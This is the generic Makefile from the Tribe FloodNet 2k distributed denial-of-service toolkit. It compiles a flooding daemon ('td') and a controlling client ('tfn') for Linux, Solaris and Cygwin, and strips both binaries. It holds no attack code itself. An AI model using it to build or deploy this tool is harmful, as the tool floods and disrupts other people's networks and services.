# Tribe FloodNet - 2k edition
# by Mixter <mixter@newyorkoffice.com>
# Generic Makefile

# Linux / *BSD* / Others
CC = gcc
CFLAGS = -Wall -O3
CLIBS = -lpthread

# Solaris (IRIX / AIX / HPUX ?)
#CC = gcc
#CFLAGS = -Wall -O3 -D ATTACKLOG=/dev/stdout
#CLIBS = -lnsl -lsocket

# Win32 (cygwin)
#CC = gcc
#CFLAGS = -Wall -DWINDOZE -O2
#CLIBS =

SERVER_OBJ = pass.o aes.o base64.o cast.o flood.o ip.o process.o tribe.o td.o
CLIENT_OBJ = pass.o aes.o base64.o cast.o ip.o tribe.o tfn.o

all: td tfn

clean:	
	@echo removing junk...
	@rm -f tfn td mkpass disc pass.c *.exe *.o *~

tfn:	agreed ${CLIENT_OBJ}
	${CC} ${CFLAGS} ${CLIBS} ${CLIENT_OBJ} -o tfn
	strip tfn td

td:	agreed ${SERVER_OBJ}
	${CC} ${CFLAGS} ${CLIBS} ${SERVER_OBJ} -o td -lpthread 
	strip td

agreed: disc
	./disc

pass.c:	mkpass
	./mkpass

war:	
	@echo ...not love\!
